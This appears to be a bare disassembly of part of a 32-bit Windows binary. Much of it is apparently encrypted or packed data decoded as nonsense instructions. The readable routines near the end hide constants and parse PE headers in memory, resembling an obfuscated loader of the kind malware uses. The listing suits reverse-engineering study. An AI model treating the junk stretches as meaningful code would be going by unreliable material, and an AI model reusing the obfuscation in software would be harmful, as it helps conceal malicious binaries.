  40c5a1:	pusha  
  40c5a2:	mov    esp,0xa6c7382a
  40c5a7:	mov    bl,0xa4
  40c5a9:	test   DWORD PTR [eax+0x22],eax
  40c5ac:	adc    DWORD PTR [edi],edx
  40c5ae:	cli    
  40c5af:	cmp    bl,dh
  40c5b1:	jg     0x40c62f
  40c5b3:	stos   DWORD PTR es:[edi],eax
  40c5b4:	hlt    
  40c5b5:	pop    edi
  40c5b6:	add    BYTE PTR [ebp+0x6a],0x31
  40c5ba:	sub    ah,BYTE PTR [edi+0x6f]
  40c5bd:	not    dl
  40c5bf:	sub    al,bl
  40c5c1:	das    
  40c5c2:	push   es
  40c5c3:	push   esp
  40c5c4:	fbld   TBYTE PTR [edi+0x79]
  40c5c7:	inc    edx
  40c5c8:	sar    BYTE PTR [ebp+0x10c6167],0xc0
  40c5cf:	adc    BYTE PTR [ebx],ah
  40c5d1:	dec    ebp
  40c5d2:	add    di,WORD PTR [edx-0x543ff09e]
  40c5d9:	mov    dh,0x26
  40c5db:	cdq    
  40c5dc:	mov    al,ds:0x153c1648
  40c5e1:	in     eax,0xb2
  40c5e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e4:	hlt    
  40c5e5:	push   ecx
  40c5e6:	inc    edx
  40c5e7:	arpl   WORD PTR [ecx+edi*1+0x6cc15023],ax
  40c5ee:	jno    0x40c61c
  40c5f0:	mov    ebp,gs
  40c5f2:	push   esi
  40c5f3:	shr    DWORD PTR [eax],1
  40c5f5:	out    dx,eax
  40c5f6:	retf   0x1ada
  40c5f9:	shl    DWORD PTR [ecx-0x39],0x84
  40c5fd:	push   esi
  40c5fe:	pop    ebp
  40c5ff:	sbb    dl,BYTE PTR [esi-0x57e13650]
  40c605:	inc    edx
  40c606:	or     BYTE PTR [edi+0xb],dh
  40c609:	(bad)  
  40c60a:	rcl    BYTE PTR [ebx+0x79],0x4f
  40c60e:	ins    DWORD PTR es:[edi],dx
  40c60f:	rcr    bh,1
  40c611:	fisttp WORD PTR [edx+0x3a70f5fd]
  40c617:	push   0x5e
  40c619:	out    dx,al
  40c61a:	loop   0x40c694
  40c61c:	add    DWORD PTR [ecx+0x4],ecx
  40c61f:	mov    al,0xd6
  40c621:	neg    dh
  40c623:	scas   eax,DWORD PTR es:[edi]
  40c624:	cli    
  40c625:	mov    ah,BYTE PTR [edx+0x82bfe98]
  40c62b:	outs   dx,DWORD PTR ds:[esi]
  40c62c:	mul    DWORD PTR ds:0x1ab77a74
  40c632:	mov    bh,0xae
  40c634:	retf   0x9ac7
  40c637:	add    al,0xa9
  40c639:	xor    esp,DWORD PTR [edx+0x156e42f1]
  40c63f:	cmp    BYTE PTR [esi],bh
  40c641:	mov    al,0x2
  40c643:	xchg   ebx,eax
  40c644:	out    dx,eax
  40c645:	stc    
  40c646:	jo     0x40c5ed
  40c648:	push   edx
  40c649:	or     al,0x7a
  40c64b:	mov    ebp,edx
  40c64d:	inc    ebp
  40c64e:	xor    eax,0x97c36202
  40c653:	push   esi
  40c654:	mov    edx,0xb67b3edb
  40c659:	jne    0x40c6be
  40c65b:	loopne 0x40c6c8
  40c65d:	cwde   
  40c65e:	jne    0x40c628
  40c660:	cmp    cl,ch
  40c662:	fcmovu st,st(0)
  40c664:	bound  ebx,QWORD PTR [eax-0x78257d8f]
  40c66a:	popa   
  40c66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c66d:	in     eax,dx
  40c66e:	mov    edi,0x41bd1df9
  40c673:	retf   
  40c674:	fsub   DWORD PTR ds:0x1c4b8ecc
  40c67a:	jmp    0x40c638
  40c67c:	adc    al,0xbb
  40c67e:	push   0x67
  40c680:	mov    DWORD PTR [esi],0x556c53f7
  40c686:	test   dh,al
  40c688:	fadd   DWORD PTR [eax+0x3c7c8ac4]
  40c68e:	repnz lods eax,DWORD PTR ds:[esi]
  40c690:	hlt    
  40c691:	push   edx
  40c692:	pop    ebx
  40c693:	pop    edi
  40c694:	xor    al,0x9f
  40c696:	rol    BYTE PTR [esi],0x39
  40c699:	adc    dh,BYTE PTR [eax]
  40c69b:	ret    0x760b
  40c69e:	jb     0x40c66a
  40c6a0:	add    bl,BYTE PTR [eax]
  40c6a2:	lahf   
  40c6a3:	xchg   esp,eax
  40c6a4:	lock jmp 0x3a6e:0xa8138b8
  40c6ac:	mov    ebx,0x56d0ae8e
  40c6b1:	ins    BYTE PTR es:[edi],dx
  40c6b2:	jae    0x40c69c
  40c6b4:	add    dl,BYTE PTR ds:0x37425246
  40c6ba:	hlt    
  40c6bb:	stos   BYTE PTR es:[edi],al
  40c6bc:	mov    esi,0xe57d47f
  40c6c1:	jl     0x40c6e4
  40c6c3:	int3   
  40c6c4:	add    BYTE PTR [esp+eiz*8+0x4a],ch
  40c6c8:	pop    ebp
  40c6c9:	mov    ecx,0xb9ccff50
  40c6ce:	daa    
  40c6cf:	jnp    0x40c716
  40c6d1:	call   0x83662d7f
  40c6d6:	popf   
  40c6d7:	pop    edx
  40c6d8:	cs icebp 
  40c6da:	fcom   DWORD PTR [edi-0x1e9904c7]
  40c6e0:	ds jne 0x40c6b2
  40c6e3:	ret    0xd24c
  40c6e6:	jnp    0x40c6a5
  40c6e8:	popf   
  40c6e9:	xor    BYTE PTR ds:0xac774e88,dl
  40c6ef:	daa    
  40c6f0:	je     0x40c685
  40c6f2:	into   
  40c6f3:	mov    ds:0xfbc8f759,eax
  40c6f8:	repz lock sub ebx,0x66
  40c6fd:	inc    edi
  40c6fe:	cld    
  40c6ff:	jg     0x40c721
  40c701:	jge    0x40c6ed
  40c703:	pop    eax
  40c704:	pushf  
  40c705:	inc    ebp
  40c706:	fs inc ecx
  40c708:	test   DWORD PTR [eax+0x22e7276a],ecx
  40c70e:	bound  ebx,QWORD PTR [edx]
  40c710:	retf   
  40c711:	cmc    
  40c712:	inc    esp
  40c713:	dec    eax
  40c714:	mov    ds:0x284668ab,eax
  40c719:	lods   al,BYTE PTR ds:[esi]
  40c71a:	mov    eax,0xfae0e613
  40c71f:	int3   
  40c720:	pop    edi
  40c721:	lahf   
  40c722:	add    edi,esp
  40c724:	mov    al,0x69
  40c726:	jo     0x40c735
  40c728:	es mov ebx,0x71ecfe6f
  40c72e:	shl    BYTE PTR ds:0x31315fb1,1
  40c734:	sub    BYTE PTR [ecx*8+0x40bc50c3],ah
  40c73b:	jae    0x40c7af
  40c73d:	loop   0x40c6ee
  40c73f:	fcomp  QWORD PTR [edx]
  40c741:	cmp    eax,0x73282772
  40c746:	push   ecx
  40c747:	cdq    
  40c748:	cmp    eax,0xe275d4e3
  40c74d:	xchg   esi,eax
  40c74e:	ds mov ah,0x14
  40c751:	push   ebp
  40c752:	sub    ah,BYTE PTR [ecx+0x39a3580]
  40c758:	cmp    eax,0x345a15f4
  40c75d:	dec    edi
  40c75e:	sbb    al,0xb1
  40c760:	mov    bh,0xa7
  40c762:	dec    edi
  40c763:	fcom   DWORD PTR [eax]
  40c765:	xor    al,0x63
  40c767:	(bad)  
  40c768:	repnz mov dl,0xed
  40c76b:	lock xchg ebp,eax
  40c76d:	(bad)  
  40c76e:	in     eax,0x7
  40c770:	je     0x40c7df
  40c772:	xlat   BYTE PTR ds:[ebx]
  40c773:	mov    dl,0x85
  40c775:	cwde   
  40c776:	xor    al,0xb6
  40c778:	xchg   BYTE PTR [ebx+0x64],dl
  40c77b:	enter  0xa1e8,0x41
  40c77f:	mov    cs,edi
  40c781:	jecxz  0x40c776
  40c783:	push   es
  40c784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c785:	leavew 
  40c787:	pop    ss
  40c788:	cmp    DWORD PTR [edi],0xfffffff2
  40c78b:	or     ecx,DWORD PTR [eax+0x5f]
  40c78e:	mov    ch,0x27
  40c790:	pop    esp
  40c791:	add    cl,cl
  40c793:	adc    eax,DWORD PTR [esp+eiz*8-0x27]
  40c797:	push   cs
  40c798:	sti    
  40c799:	int    0x46
  40c79b:	and    BYTE PTR [eax+ecx*2],dl
  40c79e:	add    DWORD PTR [ebp-0x71fc410],eax
  40c7a4:	test   DWORD PTR [eax],ebx
  40c7a6:	mov    edi,DWORD PTR [esi]
  40c7a8:	cs ret 0xa623
  40c7ac:	icebp  
  40c7ad:	inc    esi
  40c7ae:	push   DWORD PTR ds:[ebx+0x3cc36453]
  40c7b5:	jp     0x40c73c
  40c7b7:	imul   edi,esi,0xf63e9810
  40c7bd:	ret    
  40c7be:	adc    eax,0x52e6b07c
  40c7c3:	fistp  WORD PTR [esi]
  40c7c5:	aaa    
  40c7c6:	mov    ebp,0x30b5d4e5
  40c7cb:	jecxz  0x40c7a3
  40c7cd:	jecxz  0x40c7ec
  40c7cf:	mov    ah,0x41
  40c7d1:	aas    
  40c7d2:	(bad)  
  40c7d3:	or     dh,bh
  40c7d5:	popa   
  40c7d6:	mov    ecx,DWORD PTR [ebp-0x8]
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	sub    edi,DWORD PTR [edx]
  40c801:	mov    ds:0x7e82c9d3,al
  40c806:	jle    0x40c836
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c82e
  40c80c:	jmp    0x7cce93cc
  40c811:	in     al,dx
  40c812:	scas   eax,DWORD PTR es:[edi]
  40c813:	xlat   BYTE PTR ds:[ebx]
  40c814:	ret    
  40c815:	leave  
  40c816:	sbb    DWORD PTR [edi-0x31],edi
  40c819:	push   esi
  40c81a:	jo     0x40c7b1
  40c81c:	mov    ecx,0xd2a210e0
  40c821:	rol    ah,0xfd
  40c824:	and    BYTE PTR [edi+0x4a4ffc60],bl
  40c82a:	clc    
  40c82b:	cld    
  40c82c:	cld    
  40c82d:	pop    ds
  40c82e:	sub    eax,0x1863ec42
  40c833:	cmp    ebx,esi
  40c835:	dec    ebx
  40c836:	pop    ds
  40c837:	xor    al,0x42
  40c839:	ret    0xddff
  40c83c:	add    BYTE PTR [eax-0x6e719ecb],bh
  40c842:	aaa    
  40c843:	and    BYTE PTR [edx+0x7b3d6aa2],dh
  40c849:	aaa    
  40c84a:	dec    ebp
  40c84b:	sbb    DWORD PTR [ebp+0x3e],ecx
  40c84e:	test   eax,0x95033ceb
  40c853:	bnd jae 0x40c88a
  40c856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c857:	fidivr DWORD PTR [ebp+0x10ccdcb5]
  40c85d:	stc    
  40c85e:	mov    ebx,fs
  40c860:	jne    0x40c8bc
  40c862:	pop    edi
  40c863:	repnz mov eax,ds:0xeef15bd7
  40c869:	jmp    0x40c7f0
  40c86b:	push   eax
  40c86c:	clc    
  40c86d:	shr    DWORD PTR [esi+0x7b],1
  40c870:	cmp    eax,0xca4ecd6f
  40c875:	pusha  
  40c876:	cdq    
  40c877:	mov    ecx,DWORD PTR [esi+0x76]
  40c87a:	call   0xa285:0x529d5807
  40c881:	es adc ecx,ecx
  40c884:	lods   eax,DWORD PTR ds:[esi]
  40c885:	and    esi,ecx
  40c887:	mov    ds:0xae3e6b2e,al
  40c88c:	stc    
  40c88d:	mov    eax,ds:0xecada902
  40c892:	stos   BYTE PTR es:[edi],al
  40c893:	stc    
  40c894:	int3   
  40c895:	mov    gs,eax
  40c897:	mov    al,0x54
  40c899:	lds    eax,FWORD PTR [esi-0x5d]
  40c89c:	fsubr  QWORD PTR [esi+0x40]
  40c89f:	mov    ?,WORD PTR [eax+0x15b29c53]
  40c8a5:	mov    bl,0x50
  40c8a7:	out    dx,al
  40c8a8:	dec    esi
  40c8a9:	in     eax,0x97
  40c8ab:	mov    dl,0x35
  40c8ad:	pusha  
  40c8ae:	jno    0x40c8b8
  40c8b0:	retw   
  40c8b2:	inc    ebp
  40c8b3:	outs   dx,BYTE PTR ds:[esi]
  40c8b4:	push   eax
  40c8b5:	cmp    DWORD PTR [eax+0x51],edx
  40c8b8:	or     al,0x5b
  40c8ba:	call   0x6b6b65ae
  40c8bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8c0:	cmp    ebx,eax
  40c8c2:	in     eax,0x51
  40c8c4:	(bad)  
  40c8c5:	es xor eax,0xb22d6873
  40c8cb:	iret   
  40c8cc:	xor    eax,DWORD PTR [ebx-0x13]
  40c8cf:	sub    ch,BYTE PTR [ebp-0x6c5d3e08]
  40c8d5:	mov    eax,0x6fec446a
  40c8da:	pop    eax
  40c8db:	xchg   edx,eax
  40c8dc:	pop    eax
  40c8dd:	(bad)  
  40c8de:	mov    ebx,DWORD PTR [esi]
  40c8e0:	mov    esp,0x44689b10
  40c8e5:	bound  edi,QWORD PTR [esi]
  40c8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8e8:	(bad)  
  40c8e9:	sub    bl,bh
  40c8eb:	shl    BYTE PTR [edx+esi*2-0x1b],0x2
  40c8f0:	iret   
  40c8f1:	pop    edx
  40c8f2:	mov    bh,0xf4
  40c8f4:	adc    DWORD PTR [ebx+edi*4],ebx
  40c8f7:	mov    edx,0xc1fbfc57
  40c8fc:	sub    eax,0x64ab11f3
  40c901:	mov    ecx,0xa6d9b062
  40c906:	sub    bh,BYTE PTR [edx+0x67194647]
  40c90c:	dec    esi
  40c90d:	cmp    ecx,ebx
  40c90f:	push   0xffffffbb
  40c911:	retf   0xc8ff
  40c914:	hlt    
  40c915:	xchg   ecx,eax
  40c916:	push   edi
  40c917:	push   es
  40c918:	std    
  40c919:	hlt    
  40c91a:	mov    DWORD PTR [esp+ebx*4],esp
  40c91d:	scas   al,BYTE PTR es:[edi]
  40c91e:	cmp    eax,0x67fa3c21
  40c923:	adc    eax,0x18b31094
  40c928:	jecxz  0x40c8b7
  40c92a:	adc    bh,cl
  40c92c:	xor    ebp,DWORD PTR [eax+0x6c1fe125]
  40c932:	xlat   BYTE PTR ds:[ebx]
  40c933:	jnp    0x40c993
  40c935:	cmp    cl,bl
  40c937:	or     al,0xc7
  40c939:	xor    DWORD PTR [eax+edi*2],esp
  40c93c:	pushf  
  40c93d:	std    
  40c93e:	mov    bl,0x3f
  40c940:	mov    eax,ds:0x82fafaa
  40c945:	jmp    0x40c929
  40c947:	(bad)  
  40c949:	jle    0x40c9a4
  40c94b:	data16 (bad) 
  40c94d:	mov    ah,0x8e
  40c94f:	mov    edi,0xe868e347
  40c954:	lea    ebp,[ebp+0x76ecaa61]
  40c95a:	stc    
  40c95b:	and    BYTE PTR [ecx+0x29263e0b],dl
  40c961:	popa   
  40c962:	mov    dh,BYTE PTR ds:0x1e7ccc5c
  40c968:	push   ecx
  40c969:	retf   
  40c96a:	fiadd  DWORD PTR [ecx+0x9]
  40c96d:	jle    0x40c9bd
  40c96f:	dec    ecx
  40c970:	(bad)  
  40c971:	call   0xd27f:0x3fc33689
  40c978:	xchg   edi,eax
  40c979:	add    BYTE PTR ss:[eax+0x5cf94759],0xb2
  40c981:	(bad)  
  40c982:	out    dx,eax
  40c983:	cmp    DWORD PTR [ecx-0x7a],ecx
  40c986:	sbb    BYTE PTR [esi+0x3ab4f1cf],dl
  40c98c:	xchg   ebx,eax
  40c98d:	mov    esi,0x4dd2206b
  40c992:	sbb    al,0xed
  40c995:	jno    0x40c9e7
  40c997:	mov    cl,0x77
  40c999:	sbb    eax,0xf3291e16
  40c99e:	lods   al,BYTE PTR ds:[esi]
  40c99f:	add    eax,0x991f3db2
  40c9a4:	mov    bh,0x2
  40c9a6:	mov    cl,0xb8
  40c9a8:	leave  
  40c9a9:	icebp  
  40c9aa:	popa   
  40c9ab:	jmp    0x38e8:0x3586322f
  40c9b2:	es in  eax,dx
  40c9b4:	xchg   esp,eax
  40c9b5:	ss push es
  40c9b7:	fldenv [esi+0xa]
  40c9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9bb:	inc    ecx
  40c9bc:	nop/reserved BYTE PTR [edx-0x179cd156]
  40c9c3:	out    dx,al
  40c9c4:	cdq    
  40c9c5:	pop    ds
  40c9c6:	retf   
  40c9c7:	cmp    al,0x36
  40c9c9:	jmp    0x910a:0x6a5c6c5c
  40c9d0:	mov    edx,0x9b977cbb
  40c9d5:	out    dx,al
  40c9d6:	inc    edx
  40c9d7:	adc    ch,BYTE PTR [esi]
  40c9d9:	das    
  40c9da:	test   al,0xb4
  40c9dc:	jne    0x40ca1d
  40c9de:	xchg   edx,eax
  40c9df:	out    0xc5,eax
  40c9e1:	jge    0x40c973
  40c9e3:	mov    WORD PTR [ebx-0x7f],cs
  40c9e6:	lahf   
  40c9e7:	dec    ecx
  40c9e8:	mov    esi,0x1de76ee0
  40c9ed:	mul    BYTE PTR [ecx-0x22]
  40c9f0:	dec    esp
  40c9f1:	ror    edi,1
  40c9f3:	into   
  40c9f4:	scas   eax,DWORD PTR es:[edi]
  40c9f5:	xor    BYTE PTR [ebx+eax*8+0x6d1467c0],ah
  40c9fc:	xor    esi,esp
  40c9fe:	push   edx
  40c9ff:	pop    eax
  40ca00:	pop    ebx
  40ca01:	lea    ebp,[ecx+0x57]
  40ca04:	gs mov bl,0x68
  40ca07:	pop    es
  40ca08:	sar    BYTE PTR [eax-0x6022405d],1
  40ca0e:	imul   ebx,DWORD PTR [esi],0x11
  40ca11:	push   ebp
  40ca12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca13:	pop    edx
  40ca14:	fs loop 0x40ca82
  40ca17:	das    
  40ca18:	sahf   
  40ca19:	adc    bh,BYTE PTR [ecx+0x59d34df5]
  40ca1f:	mov    al,ss:0x71346d0f
  40ca25:	in     al,dx
  40ca26:	(bad)  
  40ca28:	rol    BYTE PTR [ecx+0x46],0x9f
  40ca2c:	sti    
  40ca2d:	arpl   WORD PTR [ebx+0x7b8665ec],sp
  40ca33:	lock add DWORD PTR [esi+0x77fc2f7f],edi
  40ca3a:	cmp    esp,DWORD PTR [edi]
  40ca3c:	jge    0x40ca7a
  40ca3e:	cmp    BYTE PTR ds:0xadba5251,cl
  40ca44:	jg     0x40ca29
  40ca46:	mov    bh,0xca
  40ca48:	sub    eax,0x45cb59f9
  40ca4d:	and    al,0x1d
  40ca4f:	mov    WORD PTR [edx-0x780b130a],gs
  40ca55:	mov    ebx,0xc54e0090
  40ca5a:	cmp    BYTE PTR es:[edi],0xeb
  40ca5e:	sbb    eax,0x986c49d9
  40ca63:	adc    al,BYTE PTR [ecx-0x73]
  40ca66:	push   ebx
  40ca67:	pop    edx
  40ca68:	and    DWORD PTR [edi+0x4c],edx
  40ca6b:	dec    ebx
  40ca6c:	mov    BYTE PTR [edx],ch
  40ca6e:	je     0x40ca9e
  40ca70:	push   ds
  40ca71:	test   BYTE PTR [esi+0x1cc7d7b0],cl
  40ca77:	test   DWORD PTR [edi-0x178b680],0x8ccd7fc7
  40ca81:	scas   al,BYTE PTR es:[edi]
  40ca82:	outs   dx,DWORD PTR ds:[esi]
  40ca83:	push   ebx
  40ca84:	pusha  
  40ca85:	scas   al,BYTE PTR es:[edi]
  40ca86:	(bad)  
  40ca87:	and    al,0x91
  40ca89:	jbe    0x40ca39
  40ca8b:	mov    ebx,0xaa85c4d7
  40ca90:	shr    DWORD PTR [eax+0x59f1d6fd],0x3e
  40ca97:	psubw  mm7,mm0
  40ca9a:	imul   ebx,edi,0xffffffdf
  40ca9d:	test   BYTE PTR [edx+0x1d],bl
  40caa0:	dec    esi
  40caa1:	xor    al,0xa5
  40caa3:	cmp    DWORD PTR [edi+edx*4-0x45cd7666],0x5b2b9bbf
  40caae:	add    BYTE PTR [ebp-0x11],bh
  40cab1:	fnstenv [edx+0x4bbff231]
  40cab7:	mov    dl,0x41
  40cab9:	xor    DWORD PTR [ecx+0x5613d0f4],eax
  40cabf:	mov    edx,ss
  40cac1:	test   eax,0xde4499b5
  40cac6:	push   es
  40cac7:	or     bh,BYTE PTR [ebx-0xc]
  40caca:	sbb    al,0x3e
  40cacc:	paddusw mm3,QWORD PTR [ebp+0x4534d561]
  40cad3:	nop
  40cad4:	shl    edx,cl
  40cad6:	pop    eax
  40cad7:	jbe    0x40ca96
  40cad9:	scas   eax,DWORD PTR es:[edi]
  40cada:	inc    ecx
  40cadb:	test   al,0x12
  40cadd:	(bad)
  40cae1:	push   cs
  40cae2:	jp     0x40cada
  40cae4:	popa   
  40cae5:	push   ss
  40cae6:	loop   0x40cad6
  40cae8:	clc    
  40cae9:	mov    bl,0x2e
  40caeb:	arpl   WORD PTR [edi],si
  40caed:	mov    edx,0xfec9a551
  40caf2:	mov    ds,WORD PTR [esi]
  40caf4:	dec    ecx
  40caf5:	addr16 aaa 
  40caf7:	retf   
  40caf8:	fnstcw WORD PTR [ebx+0x34]
  40cafb:	(bad)  
  40cafd:	mov    ds:0x270106ee,al
  40cb02:	(bad)  
  40cb04:	add    ah,BYTE PTR [edi+0x2f]
  40cb07:	mov    esp,0xd821f83d
  40cb0c:	aas    
  40cb0d:	add    DWORD PTR [ebx],ecx
  40cb0f:	and    al,0xd6
  40cb11:	hlt    
  40cb12:	mov    WORD PTR [ebp-0xe09f501],?
  40cb18:	data16 adc al,0xfe
  40cb1b:	call   0x938fc1f3
  40cb20:	push   ds
  40cb21:	adc    bh,ah
  40cb23:	ret    0x7636
  40cb26:	xchg   esp,eax
  40cb27:	mov    edx,0x613b9e9a
  40cb2c:	sqrtps xmm4,xmm7
  40cb2f:	dec    ebx
  40cb30:	dec    edi
  40cb31:	pop    esi
  40cb32:	(bad)  ds:0xbabec833
  40cb38:	mov    bl,0x5b
  40cb3a:	pop    ebx
  40cb3b:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4302d5,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x4302d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4302d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4302d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4302d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e88b
  40cc05:	cmp    DWORD PTR ds:0x4302d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4302d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4302d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4302bd,0x0
  40cc2f:	mov    eax,ds:0x4302bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4302bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4302bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e797
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e94b
  40cc6b:	cmp    DWORD PTR ds:0x4302bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e64c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430357,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ecd9
  40cd16:	mov    eax,ds:0x4302fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ec57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4302ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430367,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e640,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4302f1,0x42ec4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x4302b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4302bd,0x4302c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
